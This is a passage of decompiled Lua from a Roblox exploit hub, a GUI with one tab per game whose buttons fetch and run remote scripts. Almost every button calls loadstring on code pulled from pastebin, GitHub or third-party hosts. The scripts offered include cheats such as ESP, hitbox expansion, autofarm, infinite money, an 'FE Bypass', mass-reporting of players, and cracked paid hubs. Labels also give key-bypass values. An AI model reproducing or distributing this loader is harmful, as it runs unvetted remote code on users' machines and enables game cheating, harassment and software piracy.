          loadstring(game:HttpGet("https://pastebin.com/raw/8rwYW24K", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Mad City: Chapter 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Robo Hub",
        Callback = function()
          -- line: [0, 0] id: 167
          loadstring(game:HttpGet("https://pastefy.app/50lc56nZ/raw"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Merge For Diamonds",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kaito Hub",
        Callback = function()
          -- line: [0, 0] id: 201
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaitofyp/Merge-for-DIAMONDS-/main/Op%20script"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Mega Easy Obby",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Lvl Autofarm",
        Callback = function()
          -- line: [0, 0] id: 159
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VGXMOD99/SCRIPT-/main/Mega%20Easy%20Obby.txt"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Millionaire Empire Tycoon",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Give Cash",
        Callback = function()
          -- line: [0, 0] id: 754
          loadstring(game:HttpGet("https://pastebin.com/raw/8zhVqNGy"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Magic RNG",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Bacon Boss Scripts",
        Callback = function()
          -- line: [0, 0] id: 105
          loadstring(game:HttpGet("https://pastefy.app/4BEvBW3k/raw", true))()
        end,
      })
      local r136_4 = r4_4:MakeTab({
        Name = "Natural Disaster Survival",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r136_4:AddButton({
        Name = "CH Hub",
        Callback = function()
          -- line: [0, 0] id: 318
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
        end,
      })
      r136_4:AddButton({
        Name = "Kater Hub",
        Callback = function()
          -- line: [0, 0] id: 660
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KaterHub-Inc/NaturalDisasterSurvival/refs/heads/main/main.lua"))()
        end,
      })
      r136_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 367
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubNaturalDisasterSurvival"))()
        end,
      })
      r136_4:AddButton({
        Name = "Kron Hub",
        Callback = function()
          -- line: [0, 0] id: 714
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0"))("")
        end,
      })
      r136_4:AddButton({
        Name = "NullFire Hub",
        Callback = function()
          -- line: [0, 0] id: 720
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Thebestofhack123/2.0/refs/heads/main/NDS"))()
        end,
      })
      local r137_4 = r4_4:MakeTab({
        Name = "Ninja Legends",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r137_4:AddButton({
        Name = "Apple Scripts",
        Callback = function()
          -- line: [0, 0] id: 15
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AppleScript001/Ninjas_Legends/main/README.md", true))()
        end,
      })
      r137_4:AddButton({
        Name = "Zepsyy Hub",
        Callback = function()
          -- line: [0, 0] id: 489
          local r0_489 = "Zepsyy"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Zepsyy2/asd/main/Ninja%20Legends.lua"))()
        end,
      })
      r137_4:AddButton({
        Name = "Vynixius Hub",
        Callback = function()
          -- line: [0, 0] id: 6
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Ninja%20Legends/Script.lua"))()
        end,
      })
      r137_4:AddButton({
        Name = "Great Script",
        Callback = function()
          -- line: [0, 0] id: 106
          loadstring(game:HttpGet("https://raw.githubusercontent.com/rndmq/Serverlist/refs/heads/main/Loader"))()
        end,
      })
      r137_4:AddButton({
        Name = "Terror Hub",
        Callback = function()
          -- line: [0, 0] id: 392
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Tropxzz/Terror/main/Games/NinjaLegends.lua", true))()
        end,
      })
      r137_4:AddButton({
        Name = "Plutonium Hub",
        Callback = function()
          -- line: [0, 0] id: 530
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Naval Warfare",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Pepper.lol",
        Callback = function()
          -- line: [0, 0] id: 373
          loadstring(game:HttpGet("https://pastebin.com/raw/yqc0mVEb"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Obby But You Have Bones",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Auto Complete Obby",
        Callback = function()
          -- line: [0, 0] id: 591
          loadstring(game:HttpGet("https://pastebin.com/raw/PkA46P8C"))()
        end,
      })
      local r140_4 = r4_4:MakeTab({
        Name = "PETS GO!",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r140_4:AddButton({
        Name = "Reaper Hub",
        Callback = function()
          -- line: [0, 0] id: 607
          loadstring(game:HttpGet("https://you.whimper.xyz/reaperhub"))()
        end,
      })
      r140_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 776
          getgenv().UseKey = "25ms"
          getgenv().KeyMode = nil
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/rel/refs/heads/main/el"))()
        end,
      })
      r140_4:AddLabel("ï¿½ÑÐ»Ð¸ Ð² NS Hub Ð¿Ð¾Ð¿ÑÐ¾ÑÐ¸Ñ ÐºÐ»ÑÑ Ð²Ð¾Ñ Ð¾Ð½: 25ms")
      r140_4:AddLabel("If NS Hub asks for a key, here it is: 25ms")
      local r141_4 = r4_4:MakeTab({
        Name = "Pet Simulator 99",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r141_4:AddButton({
        Name = "Reaper Hub",
        Callback = function()
          -- line: [0, 0] id: 515
          loadstring(game:HttpGet("https://you.whimper.xyz/reaperhub"))()
        end,
      })
      r141_4:AddButton({
        Name = "Requireless",
        Callback = function()
          -- line: [0, 0] id: 467
          loadstring(game:HttpGet("https://raw.githubusercontent.com/idonthaveoneatm/lua/normal/games/PetSimulator99/src"))()
        end,
      })
      r141_4:AddButton({
        Name = "Aussie WIRE",
        Callback = function()
          -- line: [0, 0] id: 448
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        end,
      })
      local r142_4 = r4_4:MakeTab({
        Name = "Phantom Forces",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r142_4:AddButton({
        Name = "Homohack (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 487
          loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/pf_lite.lua"))()
        end,
      })
      r142_4:AddButton({
        Name = "ESP",
        Callback = function()
          -- line: [0, 0] id: 183
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderScriptSolutions/Misc/main/PhantomForcesESP"))()
        end,
      })
      local r143_4 = r4_4:MakeTab({
        Name = "Pressure",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r143_4:AddButton({
        Name = "NullFire Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 358
          loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Fire-Hub/main/Loader"))()
        end,
      })
      r143_4:AddButton({
        Name = "Nixius.xyz",
        Callback = function()
          -- line: [0, 0] id: 86
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/main/refs/heads/main/Loader.lua"))()
        end,
      })
      r143_4:AddButton({
        Name = "WT Team",
        Callback = function()
          -- line: [0, 0] id: 48
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/WTpressure"))()
        end,
      })
      r143_4:AddButton({
        Name = "Personal Hub",
        Callback = function()
          -- line: [0, 0] id: 746
          loadstring(game:HttpGet("https://raw.githubusercontent.com/LordEyes2/Script/main/PersonalHub"))()
        end,
      })
      local r144_4 = r4_4:MakeTab({
        Name = "Prison Life",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r144_4:AddButton({
        Name = "FireBlox Hub",
        Callback = function()
          -- line: [0, 0] id: 655
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Fireblox-Proj/fireblox/refs/heads/main/main.lua", true))()
        end,
      })
      r144_4:AddButton({
        Name = "Admin Commands",
        Callback = function()
          -- line: [0, 0] id: 214
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CorgiSideExploits/Prison-Life-Admin-Commands/refs/heads/main/Admin%20Commands%20V2%20Obfuscated.lua", true))()
        end,
      })
      r144_4:AddButton({
        Name = "Tbao Hub",
        Callback = function()
          -- line: [0, 0] id: 24
          loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaohubPrisonLife"))()
        end,
      })
      r144_4:AddButton({
        Name = "Skeet",
        Callback = function()
          -- line: [0, 0] id: 637
          loadstring(game:HttpGet("https://pastebin.com/raw/8j03emc9"))()
        end,
      })
      r144_4:AddButton({
        Name = "Prizz Life",
        Callback = function()
          -- line: [0, 0] id: 395
          loadstring(game:HttpGet("https://raw.githubusercontent.com/EnesXVC/Games-Scripts/main/Prison-Life-Prizz-Life"))()
        end,
      })
      r144_4:AddButton({
        Name = "FE Bypass GUI",
        Callback = function()
          -- line: [0, 0] id: 343
          loadstring("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/Fe%20bypass\", true))()\n")()
        end,
      })
      r4_4:MakeTab({
        Name = "Project Slayers",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Blindness Hub",
        Callback = function()
          -- line: [0, 0] id: 747
          loadstring(game:HttpGet("https://raw.githubusercontent.com/washingtontrichkid2/Newgay/main/ProjectSlayer"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Pull A Sword",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Vermz Hub",
        Callback = function()
          -- line: [0, 0] id: 529
          getgenv().UseKey = "25ms"
          getgenv().AllowAnyKey = false
          loadstring(game:HttpGet("http://you.whimper.xyz/PandaSVAL.lua"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Vermzky/VermzHub/refs/heads/main/FREE", true))()
        end,
      })
      local r147_4 = r4_4:MakeTab({
        Name = "Pass The Bomb",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r147_4:AddButton({
        Name = "VGX Mod",
        Callback = function()
          -- line: [0, 0] id: 263
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VGXMOD99/SCRIPT-/main/Pass%20The%20Bomb.txt"))()
        end,
      })
      r147_4:AddButton({
        Name = "Jaimz Hub",
        Callback = function()
          -- line: [0, 0] id: 354
          loadstring(game:HttpGet("https://pastebin.com/raw/g48H370x", true))()
        end,
      })
      local r148_4 = r4_4:MakeTab({
        Name = "Project Delta",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r148_4:AddButton({
        Name = "Lirp Hub",
        Callback = function()
          -- line: [0, 0] id: 293
          loadstring(game:HttpGet("https://raw.githubusercontent.com/LirpOfficial/Lirp/refs/heads/main/Loader", true))()
        end,
      })
      r148_4:AddButton({
        Name = "BBC Hub",
        Callback = function()
          -- line: [0, 0] id: 39
          loadstring(game:HttpGet("https://you.whimper.xyz/bbc"))()
        end,
      })
      local r149_4 = r4_4:MakeTab({
        Name = "Pizzeria Tycoon 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r149_4:AddButton({
        Name = "Inf Money",
        Callback = function()
          -- line: [0, 0] id: 407
          loadstring(game:HttpGet("https://pastebin.com/raw/Q1ZsVntm"))()
        end,
      })
      r149_4:AddButton({
        Name = "Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 261
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/ImprovedTycoon.lua"))()
        end,
      })
      local r150_4 = r4_4:MakeTab({
        Name = "Rivals",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r150_4:AddButton({
        Name = "8BIT Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 483
          loadstring(game:HttpGet("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
        end,
      })
      r150_4:AddButton({
        Name = "Silent Hub",
        Callback = function()
          -- line: [0, 0] id: 184
          loadstring(game:HttpGet("https://you.whimper.xyz/SilentRivals"))()
        end,
      })
      r150_4:AddButton({
        Name = "Rybowe Hub",
        Callback = function()
          -- line: [0, 0] id: 150
          loadstring(game:HttpGet("https://you.whimper.xyz/rybowe"))()
        end,
      })
      local r151_4 = r4_4:MakeTab({
        Name = "Realm Rampage",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r151_4:AddButton({
        Name = "Nobulem.cc",
        Callback = function()
          -- line: [0, 0] id: 376
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Emplic/NOBULEM/main/loader.lua"))()
        end,
      })
      r151_4:AddButton({
        Name = "Realm Rampage Script",
        Callback = function()
          -- line: [0, 0] id: 47
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CrimsonBytesLua/roblox-releases/main/realmrampage"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Race Clicker",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Kitty Hub",
        Callback = function()
          -- line: [0, 0] id: 33
          loadstring(game:HttpGet("https://whimper.xyz/kitty"))()
        end,
      })
      local r153_4 = r4_4:MakeTab({
        Name = "Rebirth Champions X",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r153_4:AddButton({
        Name = "Ywxo Hub",
        Callback = function()
          -- line: [0, 0] id: 221
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ywxoofc/specifier/refs/heads/main/3258302407.lua"))()
        end,
      })
      r153_4:AddButton({
        Name = "Toddy\'s Hub",
        Callback = function()
          -- line: [0, 0] id: 202
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ToddyTheNoobDud/Meepstuff/refs/heads/main/NameThisCool.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Reborn As Swordsman",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Rip Hub",
        Callback = function()
          -- line: [0, 0] id: 609
          _G.Theme = "Dark"
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/RebornAsSwordsman.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Ro-Ghoul",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Porry\'s Hub",
        Callback = function()
          -- line: [0, 0] id: 195
          loadstring(game:HttpGet("https://raw.githubusercontent.com/PorryDepTrai/exploit/main/DashBoostSolora.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Ragdoll Engine",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "System Broken",
        Callback = function()
          -- line: [0, 0] id: 83
          loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
        end,
      })
      r4_4:MakeTab({
        Name = "RNG Odyssey",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Femboy Ware",
        Callback = function()
          -- line: [0, 0] id: 97
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/Rng-odssey-/refs/heads/main/Code"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Randomizer",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Hitboxes And ESP",
        Callback = function()
          -- line: [0, 0] id: 585
          loadstring(game:HttpGet("https://raw.githubusercontent.com/timurgim/CheatS/refs/heads/main/ExpandHitboxRBLX"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Sol\'s RNG",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Beecon Hub",
        Callback = function()
          -- line: [0, 0] id: 665
          loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/BeeconHub/main/BeeconHub"))()
        end,
      })
      local r160_4 = r4_4:MakeTab({
        Name = "Slap Battles",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r160_4:AddButton({
        Name = "Sonder Hub",
        Callback = function()
          -- line: [0, 0] id: 537
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Sonder-hub/SonderUI/main/Main"))()
        end,
      })
      r160_4:AddButton({
        Name = "Slap Battles Hub",
        Callback = function()
          -- line: [0, 0] id: 573
          loadstring(game:HttpGet("https://rawscripts.net/raw/Slap-Battles-Open-source-for-9484", true))()
        end,
      })
      r160_4:AddButton({
        Name = "Forge Hub",
        Callback = function()
          -- line: [0, 0] id: 418
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Swim League",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Ywxo Hub",
        Callback = function()
          -- line: [0, 0] id: 306
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ywxoofc/specifier/refs/heads/main/6475810089.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Survive The Killer!",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "External.wtf",
        Callback = function()
          -- line: [0, 0] id: 704
          loadstring(game:HttpGet("https://raw.githubusercontent.com/6Hubbed/loader/refs/heads/main/key"))()
        end,
      })
      local r163_4 = r4_4:MakeTab({
        Name = "Super League Soccer",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r163_4:AddButton({
        Name = "FX Hub",
        Callback = function()
          -- line: [0, 0] id: 512
          loadstring(game:HttpGet("https://raw.githubusercontent.com/fx2024ondiscord/test/refs/heads/main/linkvertise-script-api.1.0.8/linkvertise-script-api/languages/linkvertise-script-api.lua"))()
        end,
      })
      r163_4:AddButton({
        Name = "Reach",
        Callback = function()
          -- line: [0, 0] id: 52
          loadstring(game:HttpGet("https://pastebin.com/raw/sPYF5HKw", true))()
        end,
      })
      r163_4:AddButton({
        Name = "Beast Hub",
        Callback = function()
          -- line: [0, 0] id: 739
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/beast"))()
        end,
      })
      r163_4:AddLabel("ï¿½ÑÐ»Ð¸ ÑÐºÑÐ¸Ð¿Ñ Ð½Ðµ Ð¿ÑÐ¾Ð³ÑÑÐ¶Ð°ÐµÑÑÑ Ð·Ð°Ð¿ÑÑÑÐ¸ÑÐµ ÐµÐ³Ð¾ ÐµÑÐµ ÑÐ°Ð·")
      r163_4:AddLabel("ï¿½ ÐµÑÐ»Ð¸ ÑÑÐµÐ±ÑÐµÑ ÐºÐ»ÑÑ Ð²Ð¾Ñ Ð¾Ð½: 25ms")
      r163_4:AddLabel("If the script does not load, run it again")
      r163_4:AddLabel("And if it requires a key, here it is: 25ms")
      r4_4:MakeTab({
        Name = "Saber Training Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Simple Autofarm",
        Callback = function()
          -- line: [0, 0] id: 14
          loadstring(game:HttpGet("https://pastebin.com/raw/hs2y8pWj"))()
        end,
      })
      local r165_4 = r4_4:MakeTab({
        Name = "Scythe Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r165_4:AddButton({
        Name = "Epic Hub",
        Callback = function()
          -- line: [0, 0] id: 166
          loadstring(game:HttpGet("https://scriptblox.com/raw/UPD-Scythe-Simulator-EPIC-HUB-Support-Solara-Now-WORKING-14384"))()
        end,
      })
      r165_4:AddButton({
        Name = "Simple Script",
        Callback = function()
          -- line: [0, 0] id: 224
          loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Scythe-Simulator-Simple-Script-21193"))()
        end,
      })
      local r166_4 = r4_4:MakeTab({
        Name = "Starving Artists",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r166_4:AddButton({
        Name = "Auto Draw",
        Callback = function()
          -- line: [0, 0] id: 688
          loadstring(game:HttpGet("https://github.com/usernaxo/RobloxScripts/raw/main/StarvingArtists/DrawingScript.lua", true))()
        end,
      })
      r166_4:AddLabel("ï¿½Ð¾Ð¶ÐµÑ Ð´Ð¾Ð»Ð³Ð¾ Ð·Ð°Ð³ÑÑÐ¶Ð°ÑÑÑÑ. ÐÐ»ÑÑ: usernaxo")
      r166_4:AddLabel("May take a long time to load. Key: usernaxo")
      local r167_4 = r4_4:MakeTab({
        Name = "SCP: Roleplay",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r167_4:AddButton({
        Name = "NullZen Hub",
        Callback = function()
          -- line: [0, 0] id: 668
          loadstring(game:HttpGet("https://raw.githubusercontent.com/axleoislost/NullZen/main/Scp-Roleplay"))()
        end,
      })
      r167_4:AddButton({
        Name = "Proton Hub",
        Callback = function()
          -- line: [0, 0] id: 626
          loadstring(game:HttpGet("https://rawscripts.net/raw/SCP:-Roleplay-Proton-V1-SCP-28097"))()
        end,
      })
      r167_4:AddButton({
        Name = "Ren Hub",
        Callback = function()
          -- line: [0, 0] id: 496
          loadstring(game:HttpGet("https://raw.githubusercontent.com/savinggracelua/cracks/m/renhub"))()
        end,
      })
      r167_4:AddButton({
        Name = "Report All Players",
        Callback = function()
          -- line: [0, 0] id: 758
          loadstring(game:HttpGet("https://pastebin.com/raw/1QHRRuGQ"))()
        end,
      })
      local r168_4 = r4_4:MakeTab({
        Name = "Strucid",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r168_4:AddButton({
        Name = "Advance Tech",
        Callback = function()
          -- line: [0, 0] id: 45
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AdvanceFTeam/Our-Scripts/main/AdvanceTech/StrucidV2.lua"))()
        end,
      })
      r168_4:AddButton({
        Name = "Apollo Hub",
        Callback = function()
          -- line: [0, 0] id: 219
          loadstring(game:HttpGet("https://raw.githubusercontent.com/10x00/Public-Cracks/main/Apollo%20Hub%20Crack.lua"))()
        end,
      })
      r168_4:AddButton({
        Name = "ESP",
        Callback = function()
          -- line: [0, 0] id: 393
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))()
        end,
      })
      r4_4:MakeTab({
        Name = "SharkBite 2",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "SharkBite 2 Script",
        Callback = function()
          -- line: [0, 0] id: 460
          loadstring(game:HttpGet("https://pastebin.com/raw/n0KtYzni"))()
        end,
      })
      local r170_4 = r4_4:MakeTab({
        Name = "The Strongest Battlegrounds",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r170_4:AddButton({
        Name = "Inf Trash Can",
        Callback = function()
          -- line: [0, 0] id: 108
          loadstring(game:HttpGet("https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man", true))()
        end,
      })
      r170_4:AddButton({
        Name = "Phantasm Hub (Best Script)",
        Callback = function()
          -- line: [0, 0] id: 384
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ATrainz/Phantasm/refs/heads/main/Games/TSB.lua"))()
        end,
      })
      r170_4:AddButton({
        Name = "Speed Hub X",
        Callback = function()
          -- line: [0, 0] id: 500
          loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
        end,
      })
      r170_4:AddButton({
        Name = "NSExpression 2.3",
        Callback = function()
          -- line: [0, 0] id: 283
          loadstring(game:HttpGet("https://github.com/1dontgiveaf/NSExpression/raw/main/script.lua", true))()
        end,
      })
      r170_4:AddButton({
        Name = "NS Hub",
        Callback = function()
          -- line: [0, 0] id: 72
          getgenv().KeyMode = nil
          getgenv().UseKey = "25ms"
          loadstring(game:HttpGet("https://you.whimper.xyz/keyrblx"))()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/TSBG/main/Solara"))()
        end,
      })
      r170_4:AddButton({
        Name = "Gojo Moveset",
        Callback = function()
          -- line: [0, 0] id: 701
          _G.settings = {
            RedStartupId = "rbxassetid://1177475221",
            RedHitId = "rbxassetid://8625377966",
          }
          loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua"))()
        end,
      })
      r170_4:AddButton({
        Name = "Sukuna Moveset",
        Callback = function()
          -- line: [0, 0] id: 420
          loadstring(game:HttpGet("https://raw.githubusercontent.com/zyrask/Nexus-Base/main/atomic-blademaster%20to%20sukuna"))()
        end,
      })
      r170_4:AddButton({
        Name = "Dio Moveset",
        Callback = function()
          -- line: [0, 0] id: 399
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Medley-Taboritsky/RobloxScripting/refs/heads/main/DIO_Garou_TSB"))()
        end,
      })
      r170_4:AddButton({
        Name = "Custom Movesets And More",
        Callback = function()
          -- line: [0, 0] id: 630
          loadstring(game:HttpGet("https://pastebin.com/raw/TtkZ84y0"))()
        end,
      })
      r170_4:AddButton({
        Name = "Animations",
        Callback = function()
          -- line: [0, 0] id: 634
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Mautiku/ehh/main/strong%20guest.lua.txt"))()
        end,
      })
      r170_4:AddButton({
        Name = "Express Hub",
        Callback = function()
          -- line: [0, 0] id: 181
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8824b23a4d9f2e0d62b4e69397d206b.lua"))()
        end,
      })
      r170_4:AddButton({
        Name = "Forge Hub",
        Callback = function()
          -- line: [0, 0] id: 744
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Taxi Boss",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Autofarm, Auto Customer And More",
        Callback = function()
          -- line: [0, 0] id: 248
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/main/Taxi%20Boss", true))()
        end,
      })
      local r172_4 = r4_4:MakeTab({
        Name = "Trident Survival",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r172_4:AddButton({
        Name = "Swim Hub",
        Callback = function()
          -- line: [0, 0] id: 312
          loadstring(game:HttpGet("https://raw.githubusercontent.com/SWIMHUBISWIMMING/swimhub/refs/heads/main/free_trident.lua"))()
        end,
      })
      r172_4:AddButton({
        Name = "Xaltxz V1",
        Callback = function()
          -- line: [0, 0] id: 307
          loadstring(game:HttpGet("https://pastebin.com/raw/AmmrRKFH"))()
        end,
      })
      local r173_4 = r4_4:MakeTab({
        Name = "Tower Of Hell",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r173_4:AddButton({
        Name = "Starry Hub",
        Callback = function()
          -- line: [0, 0] id: 344
          loadstring(game:HttpGet("https://luau.tech/build"))()
        end,
      })
      r173_4:AddButton({
        Name = "Garfield Hub",
        Callback = function()
          -- line: [0, 0] id: 474
          loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
        end,
      })
      r4_4:MakeTab({
        Name = "Tower Of Jumps",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Devil\'s Hub",
        Callback = function()
          -- line: [0, 0] id: 511
          loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/towerofjumpscript/main/main"))()
        end,
      })
      local r175_4 = r4_4:MakeTab({
        Name = "TPS: Street Soccer",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      })
      r175_4:AddButton({
        Name = "Atlas Hub",
        Callback = function()
          -- line: [0, 0] id: 621
          loadstring(game:HttpGet("https://raw.githubusercontent.com/DamThien332/Atlas.dev/refs/heads/main/Loader.lua"))()
        end,
      })
      r175_4:AddButton({
        Name = "Y-HUB",
        Callback = function()
          -- line: [0, 0] id: 650
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/YHUB-Community/refs/heads/main/TPS-Street-Soccer.lua"))()
        end,
      })
      r4_4:MakeTab({
        Name = "Triathlon Star Simulator",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Inf Money",
        Callback = function()
          -- line: [0, 0] id: 278
          loadstring(game:HttpGet("https://pastebin.com/raw/hZ6Hnyaa"))()
        end,
      })
      r4_4:MakeTab({
        Name = "The Survival Game",
        Icon = "rbxassetid://7733799795",
        PremiumOnly = false,
      }):AddButton({
        Name = "Code Craft",
        Callback = function()
          -- line: [0, 0] id: 730
          loadstring(game:HttpGet("https://raw.githubusercontent.com/BrySadW/CodeCRAFTCrack/refs/heads/main/CodeCraftCRACKED.txt"))()
        end,
      })
